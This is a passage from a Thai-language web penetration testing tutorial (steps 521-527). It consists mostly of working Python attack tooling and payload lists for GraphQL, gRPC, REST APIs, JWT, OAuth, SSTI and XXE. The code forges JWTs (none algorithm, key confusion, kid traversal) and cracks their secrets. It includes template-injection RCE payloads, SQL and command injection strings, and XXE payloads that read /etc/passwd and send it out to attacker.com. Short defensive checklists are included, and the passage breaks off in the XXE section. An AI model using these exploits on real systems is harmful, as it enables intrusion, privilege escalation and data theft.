# Part 53: Web Application Advanced Testing (Steps 521-530)

## ภาพรวม
ส่วนนี้ครอบคลุมการทดสอบความปลอดภัยของ Web Application ขั้นสูง ตั้งแต่ GraphQL Injection, gRPC Security, API Security Testing, JWT Attacks ไปจนถึง OAuth 2.0 Vulnerabilities

---

## Step 521: GraphQL Security Testing

### GraphQL Introspection และ Information Gathering
```python
#!/usr/bin/env python3
# graphql_tester.py

import requests
import json
from typing import Optional

class GraphQLSecurityTester:
    """GraphQL Security Testing Framework"""
    
    def __init__(self, url: str, headers: dict = None):
        self.url = url
        self.headers = headers or {'Content-Type': 'application/json'}
        self.session = requests.Session()
        self.session.headers.update(self.headers)
    
    def introspection_query(self) -> dict:
        """ดึงข้อมูล schema ผ่าน Introspection"""
        query = """
        query IntrospectionQuery {
            __schema {
                queryType { name }
                mutationType { name }
                types {
                    name
                    kind
                    fields {
                        name
                        type { name kind }
                        args { name type { name kind } }
                    }
                }
            }
        }
        """
        
        response = self.session.post(
            self.url,
            json={'query': query}
        )
        
        return response.json()
    
    def test_batch_query_dos(self, query: str, 
                              num_copies: int = 100) -> dict:
        """Test Batching Attack - ส่ง query ซ้ำหลายครั้งในครั้งเดียว"""
        # Batch: [ส่ง 100 queries พร้อมกัน = DoS หรือ brute force]
        batch = [{'query': query} for _ in range(num_copies)]
        
        response = self.session.post(self.url, json=batch)
        return response.json()
    
    def test_injection(self, field: str, injection: str) -> dict:
        """Test GraphQL Injection"""
        query = f"""
        query {{
            user(name: "{injection}") {{
                id
                name
                email
                password
            }}
        }}
        """
        
        response = self.session.post(
            self.url,
            json={'query': query}
        )
        return response.json()
    
    def test_graphql_injections(self, target_field: str) -> list:
        """Test ต่างๆ injection payloads"""
        injections = [
            # NoSQL Injection (MongoDB)
            '{$gt: ""}',
            '{$where: "1==1"}',
            # SQL Injection
            '" OR "1"="1',
            '\'; DROP TABLE users; --',
            # Template Injection
            '{{7*7}}',
            # GraphQL batching
            '\n}\nquery{__schema{types{name}}}\n{\n',
        ]
        
        results = []
        for payload in injections:
            resp = self.test_injection(target_field, payload)
            results.append({
                'payload': payload,
                'response': resp,
                'status': 'VULN' if 'data' in resp and resp['data'] else 'SAFE'
            })
        
        return results
    
    def test_authorization(self, user_query: str, 
                            admin_query: str) -> dict:
        """Test IDOR และ Authorization bypass"""
        results = {}
        
        # Test ดู data ของ user อื่น
        for user_id in range(1, 11):
            query = user_query.replace('{USER_ID}', str(user_id))
            resp = self.session.post(self.url, json={'query': query})
            data = resp.json()
            
            if 'data' in data and data['data']:
                results[user_id] = data['data']
                print(f"[!] IDOR: Can access user {user_id}")
        
        return results
    
    def test_depth_limit(self, max_depth: int = 20) -> dict:
        """Test Deep Nested Query (DoS)"""
        # สร้าง deeply nested query
        nested = 'user {'
        for _ in range(max_depth):
            nested += 'friends {'
        nested += 'id name'
        nested += '}' * max_depth + '}'
        
        query = f'query {{ {nested} }}'
        
        import time
        start = time.time()
        response = self.session.post(self.url, json={'query': query})
        elapsed = time.time() - start
        
        return {
            'query_depth': max_depth,
            'response_time': elapsed,
            'status_code': response.status_code,
            'vulnerable': elapsed > 5.0  # slow response = possible DoS
        }
    
    def bypass_introspection_block(self) -> Optional[dict]:
        """Bypass การปิด Introspection"""
        # Technique 1: ใช้ aliases
        bypass_queries = [
            # Fragment bypass
            '{ __schema { types { name } } }',
            # Whitespace bypass
            '{\n  __schema\n  {\n    types\n    {\n      name\n    }\n  }\n}',
            # Field suggestion bypass (typo -> suggestions expose schema)
            '{ __typ(name: "User") { name fields { name } } }',
        ]
        
        for query in bypass_queries:
            resp = self.session.post(self.url, json={'query': query})
            data = resp.json()
            if 'data' in data and data['data']:
                print(f"[!] Introspection bypass successful!")
                return data
        
        return None


# GraphQL Security Checklist
GRAPHQL_CHECKLIST = """
=== GraphQL Security Checklist ===

1. INTROSPECTION:
   [ ] ปิด introspection ใน production
   [ ] ไม่เปิดเผย schema ใน error messages

2. AUTHENTICATION:
   [ ] ตรวจสอบ authentication ทุก resolver
   [ ] ไม่มี unauthenticated mutations

3. AUTHORIZATION:
   [ ] Object-level authorization
   [ ] Field-level authorization  
   [ ] No IDOR vulnerabilities

4. INJECTION:
   [ ] Input validation ทุก field
   [ ] Parameterized queries
   [ ] ไม่ใช้ string interpolation

5. RATE LIMITING:
   [ ] Query depth limit
   [ ] Query complexity limit
   [ ] Batch query limit
   [ ] Rate limiting per user

6. DOS PROTECTION:
   [ ] Maximum query depth
   [ ] Maximum query complexity
   [ ] Timeout configuration
   [ ] Pagination limits
"""

if __name__ == '__main__':
    tester = GraphQLSecurityTester('http://target.local/graphql')
    
    print("[*] Running GraphQL Security Tests")
    
    # 1. Introspection
    schema = tester.introspection_query()
    print(f"[*] Schema types: {len(schema.get('data', {}).get('__schema', {}).get('types', []))}")
    
    # 2. Injection tests
    results = tester.test_graphql_injections('username')
    
    # 3. Authorization
    # tester.test_authorization('{ user(id: {USER_ID}) { email password } }', '')
    
    # 4. Depth limit
    depth_result = tester.test_depth_limit(20)
    if depth_result['vulnerable']:
        print(f"[!] Vulnerable to deep query DoS! Response time: {depth_result['response_time']:.2f}s")
```

---

## Step 522: gRPC Security Testing

### gRPC Protocol Analysis
```python
#!/usr/bin/env python3
# grpc_security_tester.py

import grpc
from grpc import experimental
import subprocess
import json

class GRPCSecurityTester:
    """gRPC Security Testing Framework"""
    
    def __init__(self, host: str, port: int, 
                 tls: bool = False, cert_path: str = None):
        self.host = host
        self.port = port
        self.address = f"{host}:{port}"
        
        if tls:
            if cert_path:
                with open(cert_path, 'rb') as f:
                    credentials = grpc.ssl_channel_credentials(f.read())
            else:
                credentials = grpc.ssl_channel_credentials()
            self.channel = grpc.secure_channel(self.address, credentials)
        else:
            self.channel = grpc.insecure_channel(self.address)
    
    def enumerate_services(self) -> list:
        """เปิดเผย services ด้วย gRPC Server Reflection"""
        # ตั้งค่า grpcurl
        cmd = f"grpcurl -plaintext {self.address} list"
        result = subprocess.run(cmd.split(), capture_output=True, text=True)
        
        services = result.stdout.strip().split('\n')
        print(f"[*] Found {len(services)} services:")
        for svc in services:
            print(f"  - {svc}")
        
        return services
    
    def describe_service(self, service_name: str) -> str:
        """ดูรายละเอียด service"""
        cmd = f"grpcurl -plaintext {self.address} describe {service_name}"
        result = subprocess.run(cmd.split(), capture_output=True, text=True)
        return result.stdout
    
    def call_method(self, service: str, method: str, 
                    data: dict, metadata: list = None) -> dict:
        """Call gRPC method"""
        data_json = json.dumps(data)
        
        cmd = ["grpcurl", "-plaintext"]
        
        if metadata:
            for key, val in metadata:
                cmd.extend(["-H", f"{key}: {val}"])
        
        cmd.extend([
            "-d", data_json,
            self.address,
            f"{service}/{method}"
        ])
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        try:
            return json.loads(result.stdout)
        except json.JSONDecodeError:
            return {'error': result.stderr, 'stdout': result.stdout}
    
    def test_authentication_bypass(self, service: str, 
                                    method: str) -> list:
        """Test authentication bypass ด้วยการเปลี่ยน metadata"""
        bypass_headers = [
            {},  # ไม่มี header
            {'authorization': 'Bearer null'},
            {'authorization': 'Bearer undefined'},
            {'authorization': 'Bearer '},
            {'x-user-id': '1'},  # direct user id
            {'x-admin': 'true'},
            {'x-forwarded-for': '127.0.0.1'},
            {'authorization': 'Bearer admin'},
        ]
        
        results = []
        for headers in bypass_headers:
            metadata = list(headers.items()) if headers else []
            resp = self.call_method(service, method, {}, metadata)
            
            results.append({
                'headers': headers,
                'response': resp,
                'bypass': 'error' not in resp
            })
            
            if 'error' not in resp:
                print(f"[!] Auth bypass with headers: {headers}")
        
        return results
    
    def test_grpc_injection(self, service: str, method: str,
                             field: str) -> list:
        """Test injection ใน gRPC fields"""
        injections = [
            "' OR '1'='1",
            "; cat /etc/passwd",
            "$(id)",
            "{{7*7}}",
            "../../../etc/passwd",
        ]
        
        results = []
        for payload in injections:
            data = {field: payload}
            resp = self.call_method(service, method, data)
            
            results.append({
                'field': field,
                'payload': payload,
                'response': resp
            })
        
        return results
    
    def test_tls_configuration(self) -> dict:
        """Test TLS configuration ของ gRPC server"""
        cmd = f"testssl.sh --grpc {self.address}"
        # หรือใช้ openssl
        openssl_cmd = f"openssl s_client -connect {self.address}"
        
        result = subprocess.run(
            openssl_cmd.split(),
            capture_output=True,
            text=True,
            timeout=10
        )
        
        return {
            'openssl_output': result.stdout,
            'certificate_info': self._parse_cert(result.stdout)
        }
    
    def _parse_cert(self, openssl_output: str) -> dict:
        info = {}
        lines = openssl_output.split('\n')
        for line in lines:
            if 'subject=' in line.lower():
                info['subject'] = line.strip()
            elif 'issuer=' in line.lower():
                info['issuer'] = line.strip()
            elif 'not after' in line.lower():
                info['expiry'] = line.strip()
        return info


# grpcurl commands
GRPCURL_COMMANDS = """
# ติดตั้ง grpcurl
go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest
# หรือ
apt install grpcurl

# List services
grpcurl -plaintext host:port list

# Describe service
grpcurl -plaintext host:port describe ServiceName

# Call method
grpcurl -plaintext -d '{"name": "world"}' host:port package.ServiceName/MethodName

# ส่ง authentication header
grpcurl -H 'Authorization: Bearer TOKEN' -plaintext host:port list

# ดู proto definition
grpcurl -plaintext host:port describe .proto.MessageType
"""
```

---

## Step 523: REST API Security Testing

### API Security Framework
```python
#!/usr/bin/env python3
# api_security_tester.py

import requests
import json
from urllib.parse import urljoin, quote

class APISecurityTester:
    """Comprehensive REST API Security Testing"""
    
    def __init__(self, base_url: str, api_key: str = None,
                 token: str = None):
        self.base_url = base_url
        self.session = requests.Session()
        
        if api_key:
            self.session.headers['X-API-Key'] = api_key
        if token:
            self.session.headers['Authorization'] = f'Bearer {token}'
    
    def discover_endpoints(self, wordlist_path: str = None) -> list:
        """ค้นหา endpoints ด้วย fuzzing"""
        if wordlist_path is None:
            # Common API endpoints
            endpoints = [
                '/api', '/api/v1', '/api/v2', '/api/v3',
                '/swagger.json', '/swagger/v2/swagger.json',
                '/openapi.json', '/api-docs',
                '/api/users', '/api/admin', '/api/auth',
                '/api/login', '/api/register', '/api/config',
                '/api/debug', '/api/health', '/api/metrics',
                '/api/internal', '/api/private', '/api/secret',
                '/.well-known/openapi.json',
                '/graphql', '/graphiql',
            ]
        else:
            with open(wordlist_path) as f:
                endpoints = [line.strip() for line in f]
        
        found = []
        for endpoint in endpoints:
            url = urljoin(self.base_url, endpoint)
            try:
                resp = self.session.get(url, timeout=5)
                if resp.status_code not in [404, 403, 301]:
                    found.append({
                        'url': url,
                        'status': resp.status_code,
                        'content_type': resp.headers.get('Content-Type', ''),
                        'length': len(resp.content)
                    })
                    print(f"[{resp.status_code}] {url}")
            except Exception:
                pass
        
        return found
    
    def test_idor(self, endpoint: str, id_range: range = None) -> list:
        """Test Insecure Direct Object Reference"""
        if id_range is None:
            id_range = range(1, 101)
        
        vulnerabilities = []
        for obj_id in id_range:
            url = urljoin(self.base_url, f"{endpoint}/{obj_id}")
            resp = self.session.get(url)
            
            if resp.status_code == 200:
                vulnerabilities.append({
                    'id': obj_id,
                    'url': url,
                    'data': resp.json() if 'json' in resp.headers.get('Content-Type', '') else resp.text[:200]
                })
                print(f"[IDOR] Found: {url}")
        
        return vulnerabilities
    
    def test_mass_assignment(self, endpoint: str, 
                              normal_data: dict) -> list:
        """Test Mass Assignment Vulnerability"""
        # เพิ่ม fields ที่ไม่ควรเป็น settable
        extra_fields = [
            {'isAdmin': True},
            {'role': 'admin'},
            {'permissions': ['admin', 'superuser']},
            {'credit': 99999},
            {'active': True, 'verified': True},
        ]
        
        results = []
        for extra in extra_fields:
            data = {**normal_data, **extra}
            resp = self.session.post(
                urljoin(self.base_url, endpoint),
                json=data
            )
            
            if resp.status_code in [200, 201]:
                resp_data = resp.json()
                # ตรวจสอบว่า extra fields ถูก set หรือไม่
                for key in extra:
                    if key in resp_data and resp_data[key] == extra[key]:
                        print(f"[!] MASS ASSIGNMENT: {key} was set to {extra[key]}")
                        results.append({
                            'field': key,
                            'value': extra[key],
                            'response': resp_data
                        })
        
        return results
    
    def test_http_methods(self, endpoint: str) -> dict:
        """Test HTTP methods ที่ไม่ควรเปิด"""
        methods = ['GET', 'POST', 'PUT', 'PATCH', 'DELETE',
                   'HEAD', 'OPTIONS', 'TRACE', 'CONNECT']
        
        url = urljoin(self.base_url, endpoint)
        results = {}
        
        for method in methods:
            try:
                resp = self.session.request(method, url, timeout=5)
                results[method] = {
                    'status': resp.status_code,
                    'allowed': resp.status_code not in [405, 501]
                }
            except Exception as e:
                results[method] = {'error': str(e)}
        
        # TRACE = อันตราย (XST - Cross-Site Tracing)
        if results.get('TRACE', {}).get('allowed'):
            print("[!] TRACE method enabled - XST vulnerability!")
        
        return results
    
    def test_rate_limiting(self, endpoint: str, 
                           num_requests: int = 100) -> dict:
        """Test Rate Limiting"""
        results = {'status_codes': [], 'rate_limited': False}
        
        for i in range(num_requests):
            resp = self.session.get(
                urljoin(self.base_url, endpoint)
            )
            results['status_codes'].append(resp.status_code)
            
            # ตรวจสอบ 429 Too Many Requests
            if resp.status_code == 429:
                results['rate_limited'] = True
                results['limited_at_request'] = i
                print(f"[+] Rate limited at request {i}")
                break
        
        if not results['rate_limited']:
            print(f"[!] NO RATE LIMITING after {num_requests} requests!")
        
        return results
    
    def test_jwt_none_algorithm(self, token: str) -> str:
        """Test JWT 'none' algorithm attack"""
        import base64
        
        # Decode token
        parts = token.split('.')
        if len(parts) != 3:
            return None
        
        # Decode header
        header_b64 = parts[0] + '=='  # add padding
        header = json.loads(base64.urlsafe_b64decode(header_b64))
        payload_b64 = parts[1] + '=='
        payload = json.loads(base64.urlsafe_b64decode(payload_b64))
        
        # แก้ algorithm เป็น none
        header['alg'] = 'none'
        payload['role'] = 'admin'  # escalate privileges
        
        # Encode ใหม่
        new_header = base64.urlsafe_b64encode(
            json.dumps(header).encode()
        ).rstrip(b'=').decode()
        
        new_payload = base64.urlsafe_b64encode(
            json.dumps(payload).encode()
        ).rstrip(b'=').decode()
        
        # none algorithm = no signature
        forged_token = f"{new_header}.{new_payload}."
        return forged_token


# Postman/curl API Testing Commands
API_COMMANDS = """
# บันทึก API request ด้วย curl
curl -X GET 'http://api.target.com/users' -H 'Authorization: Bearer TOKEN'

# Test IDOR
for id in $(seq 1 100); do
    curl -s 'http://api.target.com/users/'$id \
        -H 'Authorization: Bearer ATTACKER_TOKEN' | python3 -m json.tool
done

# Test Rate Limiting
for i in $(seq 1 200); do
    curl -s -o /dev/null -w "%{http_code}\n" 'http://api.target.com/login' \
        -d '{"username":"admin","password":"test"}'
done

# API Fuzzing with ffuf
ffuf -u 'http://api.target.com/FUZZ' -w /usr/share/wordlists/api.txt \
    -H 'Authorization: Bearer TOKEN' -mc 200,201,204

# APIkit - OpenAPI fuzzing
npm install -g @apidevtools/swagger-cli
swagger-cli validate openapi.json
"""
```

---

## Step 524: JWT Token Attacks

### JWT Vulnerability Testing
```python
#!/usr/bin/env python3
# jwt_attacker.py

import base64
import json
import hmac
import hashlib
import requests
from typing import Tuple

class JWTAttacker:
    """JWT Token Vulnerability Testing"""
    
    @staticmethod
    def decode_jwt(token: str) -> Tuple[dict, dict]:
        """Decode JWT โดยไม่ตรวจ signature"""
        parts = token.split('.')
        if len(parts) != 3:
            raise ValueError("Invalid JWT format")
        
        # Add padding
        def decode_part(part):
            padded = part + '=' * (4 - len(part) % 4)
            return json.loads(base64.urlsafe_b64decode(padded))
        
        header = decode_part(parts[0])
        payload = decode_part(parts[1])
        
        return header, payload
    
    @staticmethod
    def forge_none_alg(token: str, new_claims: dict = None) -> str:
        """JWT None Algorithm Attack"""
        header, payload = JWTAttacker.decode_jwt(token)
        
        # แก้ claims
        if new_claims:
            payload.update(new_claims)
        
        header['alg'] = 'none'
        
        def b64_encode(data):
            return base64.urlsafe_b64encode(
                json.dumps(data, separators=(',', ':')).encode()
            ).rstrip(b'=').decode()
        
        forged = f"{b64_encode(header)}.{b64_encode(payload)}."
        return forged
    
    @staticmethod
    def rs256_to_hs256_attack(token: str, public_key: str,
                               new_claims: dict = None) -> str:
        """RS256 -> HS256 Algorithm Confusion Attack
        
        เมื่อ server ใช้ RS256 แต่รับ HS256 ด้วย:
        เซ็น token ด้วย public key เป็น HMAC secret
        """
        header, payload = JWTAttacker.decode_jwt(token)
        
        if new_claims:
            payload.update(new_claims)
        
        # แก้ algorithm
        header['alg'] = 'HS256'
        
        def b64_encode(data):
            return base64.urlsafe_b64encode(
                json.dumps(data, separators=(',', ':')).encode()
            ).rstrip(b'=').decode()
        
        header_encoded = b64_encode(header)
        payload_encoded = b64_encode(payload)
        
        message = f"{header_encoded}.{payload_encoded}"
        
        # Sign ด้วย public key เป็น HMAC secret!
        if isinstance(public_key, str):
            public_key = public_key.encode()
        
        signature = hmac.new(
            public_key,
            message.encode(),
            hashlib.sha256
        ).digest()
        
        sig_encoded = base64.urlsafe_b64encode(signature).rstrip(b'=').decode()
        return f"{message}.{sig_encoded}"
    
    @staticmethod
    def crack_weak_secret(token: str, wordlist: list = None) -> str:
        """Brute force JWT ขนาดเล็ก"""
        if wordlist is None:
            # Common weak secrets
            wordlist = [
                'secret', 'password', 'key', 'jwt_secret',
                '123456', 'admin', 'test', 'change_me',
                'secret_key', 'your-256-bit-secret',
                'qwerty', 'letmein', 'welcome',
            ]
        
        parts = token.split('.')
        message = f"{parts[0]}.{parts[1]}"
        
        # Decode expected signature
        sig_padded = parts[2] + '=' * (4 - len(parts[2]) % 4)
        expected_sig = base64.urlsafe_b64decode(sig_padded)
        
        for secret in wordlist:
            sig = hmac.new(
                secret.encode(),
                message.encode(),
                hashlib.sha256
            ).digest()
            
            if sig == expected_sig:
                print(f"[+] JWT Secret found: {secret}")
                return secret
        
        return None
    
    @staticmethod
    def kid_injection_attack(template_token: str, 
                              kid_payload: str = "../../dev/null") -> dict:
        """JWT kid (Key ID) Header Injection
        
        kid บอก server ว่า key อยู่ที่ไหน:
        kid = "../../dev/null" -> server ใช้ /dev/null เป็น secret (= empty string)
        kid = "sql injection" -> SQL injection via kid
        """
        header, payload = JWTAttacker.decode_jwt(template_token)
        
        attacks = []
        
        # Attack 1: Path traversal via kid
        kid_attacks = [
            "../../dev/null",  # empty secret
            "../../proc/self/fd/0",  # stdin
            "secret.txt",  # predictable file
        ]
        
        for kid in kid_attacks:
            forged_header = {**header, 'alg': 'HS256', 'kid': kid}
            # Sign ด้วย empty string (dev/null content)
            def b64_encode(data):
                return base64.urlsafe_b64encode(
                    json.dumps(data, separators=(',', ':')).encode()
                ).rstrip(b'=').decode()
            
            h = b64_encode(forged_header)
            p = b64_encode({**payload, 'role': 'admin'})
            msg = f"{h}.{p}"
            
            # Try empty secret
            sig = hmac.new(b'', msg.encode(), hashlib.sha256).digest()
            sig_enc = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()
            
            attacks.append({
                'kid': kid,
                'token': f"{msg}.{sig_enc}"
            })
        
        # Attack 2: SQL Injection via kid
        sql_kid = "nonexistent' UNION SELECT 'attacker_secret' -- "
        attacks.append({'kid': sql_kid, 'type': 'sql_injection'})
        
        return attacks


# JWT Tools
JWT_TOOLS = """
# jwt_tool - comprehensive JWT testing
git clone https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py TOKEN

# Crack JWT secret
python3 jwt_tool.py TOKEN -C -d /usr/share/wordlists/rockyou.txt

# None algorithm attack
python3 jwt_tool.py TOKEN -X a

# RS256 -> HS256
python3 jwt_tool.py TOKEN -X k -pk public.pem

# hashcat JWT cracking
hashcat -a 0 -m 16500 TOKEN.txt /usr/share/wordlists/rockyou.txt

# JWT.io - manual decoding
# https://jwt.io/
"""
```

---

## Step 525: OAuth 2.0 และ OIDC Vulnerabilities

### OAuth 2.0 Attack Framework
```python
#!/usr/bin/env python3
# oauth_attacker.py

import requests
from urllib.parse import urlparse, parse_qs, urlencode, urljoin
import hashlib
import base64
import secrets

class OAuthAttacker:
    """OAuth 2.0 / OIDC Vulnerability Testing"""
    
    def __init__(self, auth_url: str, token_url: str,
                 client_id: str, redirect_uri: str):
        self.auth_url = auth_url
        self.token_url = token_url
        self.client_id = client_id
        self.redirect_uri = redirect_uri
        self.session = requests.Session()
    
    def test_state_csrf(self) -> dict:
        """Test OAuth CSRF (missing/predictable state parameter)"""
        # Auth request โดยไม่มี state
        no_state_url = (
            f"{self.auth_url}?"
            f"client_id={self.client_id}&"
            f"redirect_uri={self.redirect_uri}&"
            f"response_type=code&"
            f"scope=openid profile email"
        )
        
        # Auth request ที่มี state ที่คาดเดาได้
        predictable_state = "1234"
        pred_state_url = no_state_url + f"&state={predictable_state}"
        
        return {
            'no_state_url': no_state_url,
            'predictable_state_url': pred_state_url,
            'vulnerability': 'Missing or predictable state = CSRF possible'
        }
    
    def test_redirect_uri_bypass(self, auth_code_endpoint: str) -> list:
        """Test redirect_uri validation bypass"""
        bypass_payloads = [
            # Open redirect
            'https://attacker.com',
            # เพิ่ม path
            'https://legitimate.com@attacker.com',
            # Subdomain
            'https://attacker.legitimate.com',
            # Parameter pollution
            f'{self.redirect_uri}&redirect_uri=https://attacker.com',
            # Fragment bypass
            f'https://attacker.com#{self.redirect_uri}',
        ]
        
        results = []
        for uri in bypass_payloads:
            url = (
                f"{auth_code_endpoint}?"
                f"client_id={self.client_id}&"
                f"redirect_uri={requests.utils.quote(uri)}&"
                f"response_type=code&state=test123"
            )
            resp = self.session.get(url, allow_redirects=False)
            
            result = {
                'redirect_uri': uri,
                'status': resp.status_code,
                'location': resp.headers.get('Location', ''),
                'bypassed': 'attacker.com' in resp.headers.get('Location', '')
            }
            
            if result['bypassed']:
                print(f"[!] redirect_uri bypass: {uri}")
            
            results.append(result)
        
        return results
    
    def test_token_leakage_in_referrer(self, token_page_url: str) -> bool:
        """Test token หลุดเป็น Referrer header"""
        # เมื่อ access token อยู่ใน URL fragment
        # และมีการ redirect -> token หลุดเป็น Referrer!
        pass
    
    def test_pkce_bypass(self, auth_code: str, 
                          code_verifier: str = None) -> dict:
        """Test PKCE (Proof Key for Code Exchange) bypass"""
        # PKCE: code_challenge = SHA256(code_verifier)
        # ถ้า server ไม่ตรวจสอบ -> bypass!
        
        if code_verifier is None:
            code_verifier = secrets.token_urlsafe(64)
        
        # Exchange code โดยไม่ส่ง code_verifier
        resp_no_verifier = self.session.post(self.token_url, data={
            'grant_type': 'authorization_code',
            'code': auth_code,
            'redirect_uri': self.redirect_uri,
            'client_id': self.client_id
            # ไม่ส่ง code_verifier!
        })
        
        return {
            'pkce_bypass_possible': resp_no_verifier.status_code == 200,
            'response': resp_no_verifier.json() if resp_no_verifier.status_code == 200 else None
        }
    
    def test_token_substitution(self, access_token: str,
                                 another_user_token: str) -> dict:
        """Test Token Substitution - ใช้ token ของ user A แทน user B"""
        # Test ว่า server ตรวจสอบ audience/client_id ใน token หรือไม่
        results = {}
        
        # API endpoint ที่เช็ค token
        for token in [access_token, another_user_token]:
            headers = {'Authorization': f'Bearer {token}'}
            # ...
        
        return results


# OAuth/OIDC Security Checklist
OAUTH_CHECKLIST = """
=== OAuth 2.0 Security Checklist ===

AUTHORIZATION CODE FLOW:
  [ ] State parameter (ป้องกัน CSRF)
  [ ] PKCE enforcement
  [ ] Code ใช้ได้ครั้งเดียว (single-use)
  [ ] redirect_uri validation เขียวงวด
  [ ] Code expiration (< 10 minutes)

TOKENS:
  [ ] Access token อายุสั้น
  [ ] Refresh token rotation
  [ ] Token revocation
  [ ] JWT signature verification
  [ ] audience (aud) validation
  [ ] issuer (iss) validation

IMPLICIT FLOW (เลิกใช้ ถ้าเป็นไปได้):
  [ ] Token ไม่อยู่ใน URL fragment
  [ ] Referrer-Policy header
"""
```

---

## Step 526: Server-Side Template Injection (SSTI)

### SSTI Detection และ Exploitation
```python
#!/usr/bin/env python3
# ssti_tester.py

import requests
import re

class SSTITester:
    """Server-Side Template Injection Testing"""
    
    PAYLOADS = {
        # Detection payloads - แต่ละ template engine
        'jinja2': ['{{7*7}}', '{{7*\'7\'}}', '{{config}}'],
        'twig': ['{{7*7}}', '{{7*"7"}}'],
        'freemarker': ['${7*7}', '<#assign x=7*7>${x}'],
        'velocity': ['#set($x=7*7)${x}'],
        'smarty': ['{php}echo 7*7;{/php}', '{math equation="7*7"}'],
        'mako': ['${7*7}', '<%\nprint(7*7)\n%>'],
        'erb': ['<%= 7*7 %>', '<%= `id` %>'],
    }
    
    RCE_PAYLOADS = {
        'jinja2': [
            # Jinja2 RCE
            "{{''.__class__.__mro__[1].__subclasses__()[407]('id',shell=True,stdout=-1).communicate()[0].strip()}}",
            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            "{% for x in ().__class__.__base__.__subclasses__() %}{% if hasattr(x,'_module') and 'subprocess' in x.__module__ %}{{x('id',shell=True,stdout=-1).communicate()[0]}}{% endif %}{% endfor %}",
        ],
        'twig': [
            "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        ],
        'freemarker': [
            '${"freemarker.template.utility.Execute"?new()("id")}',
        ],
        'velocity': [
            '#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("exec","ls".class).invoke($e.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")',
        ]
    }
    
    def __init__(self, url: str):
        self.url = url
        self.session = requests.Session()
    
    def detect_ssti(self, param: str, method: str = 'GET') -> dict:
        """Detect SSTI vulnerability"""
        results = {}
        
        for engine, payloads in self.PAYLOADS.items():
            for payload in payloads:
                if method == 'GET':
                    resp = self.session.get(
                        self.url, params={param: payload}
                    )
                else:
                    resp = self.session.post(
                        self.url, data={param: payload}
                    )
                
                # ตรวจสอบว่ามี 49 (ผลลัพธ์ 7*7) หรือไม่
                if '49' in resp.text:
                    results[engine] = {
                        'vulnerable': True,
                        'payload': payload,
                        'evidence': '49 found in response'
                    }
                    print(f"[!] SSTI ({engine}): {payload}")
        
        return results
    
    def exploit_rce(self, param: str, engine: str,
                    command: str = 'id') -> str:
        """Exploit SSTI เพื่อ RCE"""
        if engine not in self.RCE_PAYLOADS:
            return f"No RCE payload for {engine}"
        
        for payload in self.RCE_PAYLOADS[engine]:
            # แทนคำสั่ง
            payload = payload.replace('id', command)
            
            resp = self.session.post(
                self.url, data={param: payload}
            )
            
            if resp.status_code == 200:
                return resp.text
        
        return "Exploitation failed"


# SSTI Cheatsheet
SSTI_CHEATSHEET = """
=== SSTI Quick Reference ===

Detection:
  {{7*7}}      -> Jinja2/Twig (returns 49)
  ${7*7}       -> FreeMarker/Mako (returns 49)
  #{7*7}       -> Ruby/Slim (returns 49)
  <%= 7*7 %>   -> ERB (returns 49)

Jinja2 RCE (Python):
  {{''.__class__.__mro__[1].__subclasses__()}}
  {{config.__class__.__init__.__globals__['os'].popen('id').read()}}

Twig RCE (PHP):
  {{_self.env.registerUndefinedFilterCallback('exec')}}
  {{_self.env.getFilter('id')}}

FreeMarker RCE (Java):
  ${"freemarker.template.utility.Execute"?new()("id")}

Tools:
  tplmap: python3 tplmap.py -u 'http://target.com/?name=test*'
"""
```

---

## Step 527: XML External Entity (XXE) Injection

### XXE Attack Framework
```python
#!/usr/bin/env python3
# xxe_tester.py

import requests

class XXETester:
    """XML External Entity (XXE) Injection Testing"""
    
    PAYLOADS = {
        'basic_file_read': """
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user><name>&xxe;</name></user>
""",
        'blind_ssrf': """
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://attacker.com/xxe?data=test">
]>
<user><name>&xxe;</name></user>
""",
        'blind_oob': """
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<user><name>test</name></user>
""",
        'parameter_entity': """
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
  %eval;
  %exfil;
]>
<foo>test</foo>
""",
        'jar_protocol': """
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "jar:file:///path/to/file.jar!/">
]>
<foo>&xxe;</foo>
""",
        'dos_billion_laughs': """
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<foo>&lol4;</foo>
"""
    }
    
    def __init__(self, url: str):
        self.url = url
        self.session = requests.Session()
    
    def test_xxe(self, payload_type: str = 'basic_file_read',
                 content_type: str = 'application/xml') -> dict:
        """Test XXE vulnerability"""
        payload = self.PAYLOADS.get(payload_type, '')
        
        headers = {'Content-Type': content_type}
        resp = self.session.post(
            self.url,
            data=payload,
            headers=headers
        )
        
        # ตรวจสอบว่ามีโครงสร้าง /etc/passwd
        vulnerable = 'root:x:0:0' in resp.text
        
        return {
            'payload_type': payload_type,
            'status_code': resp.status_code,
            'vulnerable': vulnerable,
            'response_excerpt': resp.text[:500]
        }
    
    def test_all_payloads(self) -> list:
        """ทดสอบทุก payload"""
        results = []
        for payload_type in self.PAYLOADS:
            if 'dos' in payload_type:
                continue  # ข้าม DoS payloads
            result = self.test_xxe(payload_type)
            results.append(result)
            if result['vulnerable']:
                print(f"[!] VULNERABLE to {payload_type}!")
